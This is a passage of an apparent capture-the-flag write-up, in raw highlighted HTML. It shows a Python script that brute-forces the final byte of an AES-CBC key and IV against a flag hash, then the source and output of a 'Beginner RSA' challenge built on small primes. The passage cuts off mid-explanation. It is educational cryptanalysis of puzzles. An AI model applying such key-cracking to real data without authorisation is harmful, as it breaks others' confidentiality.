style=\"color:#22863A;--shiki-dark:#F78C6C\">\\x18\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">  #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Example encrypted data\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">original_key \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">the_enc_key_is_\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">original_iv \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">my_great_iv_is_\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Original flag and its hash\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">flag_hash \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">6a96111d69e015a07e96dcd141d31e7fc81c4420dbbef75aef5201809093210e\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Brute-force through all possible key and iv combinations\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">for\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> key_byte \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\"> range\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">256\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    for\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> iv_byte \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\"> range\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">256\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">        #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Append the guessed byte to the original key and iv\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        key \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> original_key \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> bytes\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">[\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">key_byte\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">]\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        iv \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> original_iv \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> bytes\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">[\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">iv_byte\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">]\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">        #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Create AES cipher object\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        cipher \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\"> AES\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">new\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">key\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> AES.MODE_CBC\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> iv\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        try\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">            #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Decrypt the encrypted data\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            decrypted_data \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> cipher\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">decrypt\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">enc\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">            #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Unpad the decrypted data\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            plaintext \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> unpad\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">decrypted_data\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> AES.block_size\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">            #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Calculate SHA-256 hash of the plaintext\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            sha256_hash \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> hashlib\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">sha256\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">plaintext\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">).\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">hexdigest\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">            #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Compare with original flag hash\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> sha256_hash \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">==\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> flag_hash\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">                print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\"Decrypted flag: \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">plaintext.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">decode\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">utf-8\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">                print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\"Guessed Key: \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">key\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">                print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\"Guessed IV: \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">iv\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">                break\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">  #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Exit the loop if flag is found\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        except\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> ValueError\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">            #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Incorrect decryption (padding error), continue to next key/iv combination\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            continue\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    else\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        continue\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">  #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Continue outer loop if flag not found\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    break\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">  #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Exit outer loop if flag is found\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch4 id=\"beginner-rsa\">Beginner RSA\u003C/h4>\n\u003Cblockquote>\n\u003Cp>Do you know RSA?\u003C/p>\n\u003C/blockquote>\n\u003Cp>Let’s look at the source code provided:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> Crypto\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">Util\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">number \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> *\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">p \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> getPrime\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">q \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> getPrime\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">r \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> getPrime\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">s \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> getPrime\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">a \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> getPrime\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">n \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> p\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">q\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">r\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">s\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">a\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">e \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> 0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">10001\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\">FLAG\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">FLAG{This_is_a_fake_flag}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">m \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> bytes_to_long\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">FLAG\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">enc \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\"> pow\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">m\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> e\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> n\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'n = \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">n\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'e = \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">e\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'enc = \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">enc\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">n\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> =\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">e\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> =\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 65537\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">enc\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> =\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>We can see 5 primes are used in our 